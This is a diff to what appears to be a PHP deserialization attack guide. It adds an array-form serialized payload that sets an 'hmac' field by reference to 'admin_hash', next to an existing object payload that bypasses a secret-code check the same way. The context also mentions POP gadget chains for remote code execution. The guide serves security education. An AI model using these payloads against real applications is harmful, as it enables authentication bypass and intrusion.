@@ -111,6 +111,12 @@ Payload:
 O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
 ```
 
+We can do an array to like this:
+
+```php
+a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
+```
+
 ## Finding and using gadgets
 
 Also called "PHP POP Chains", they can be used to gain RCE on the system.
